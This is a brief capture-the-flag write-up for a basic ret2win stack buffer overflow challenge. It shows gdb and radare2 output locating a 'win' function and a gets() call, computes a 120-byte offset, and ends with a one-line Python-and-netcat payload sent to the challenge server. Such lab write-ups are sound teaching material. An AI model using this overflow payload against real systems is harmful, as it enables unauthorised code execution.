A very basic buffer overflow -> ovewrite return address exploitation challange. Goal was to execute "win" function and display flag. Below steps to exploit binary:

1. Find "win" function address

```
gdb ret2basic

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  free@plt
0x0000000000401040  puts@plt
0x0000000000401050  fclose@plt
0x0000000000401060  setbuf@plt
0x0000000000401070  printf@plt
0x0000000000401080  rewind@plt
0x0000000000401090  fgets@plt
0x00000000004010a0  ftell@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  malloc@plt
0x00000000004010d0  fseek@plt
0x00000000004010e0  fopen@plt
0x00000000004010f0  exit@plt
0x0000000000401100  _start
0x0000000000401130  _dl_relocate_static_pie
0x0000000000401140  deregister_tm_clones
0x0000000000401170  register_tm_clones
0x00000000004011b0  __do_global_dtors_aux
0x00000000004011e0  frame_dummy
0x00000000004011e6  setup
0x0000000000401215  win
0x000000000040130f  vuln
0x000000000040133c  main
0x0000000000401360  __libc_csu_init
0x00000000004013d0  __libc_csu_fini
0x00000000004013d8  _fini
(gdb)
```

2. Check vulnerable function overflow:

```
[0x00401215]> s sym.vuln
[0x0040130f]> pd
            ;-- vuln:
            0x0040130f      55             push rbp
            0x00401310      4889e5         mov rbp, rsp
            0x00401313      4883ec70       sub rsp, 0x70
            0x00401317      488d3d3c0d00.  lea rdi, qword str.Can_you_overflow_this_: ; 0x40205a ; "Can you overflow this?: "
            0x0040131e      b800000000     mov eax, 0
            0x00401323      e848fdffff     call sym.imp.printf
            0x00401328      488d4590       lea rax, qword [rbp - 0x70]
            0x0040132c      4889c7         mov rdi, rax
            0x0040132f      b800000000     mov eax, 0
            0x00401334      e877fdffff     call sym.imp.gets
            0x00401339      90             nop
            0x0040133a      c9             leave
            0x0040133b      c3             ret
```

3. Calculate buffer length:
0x70 + 0x8 = 120 - buffer length 

Overflow stack frame to return to address of the function win

` (python -c "print 'A'*120 + '\x15\x12\x40'") | nc challenge.nahamcon.com 30384`
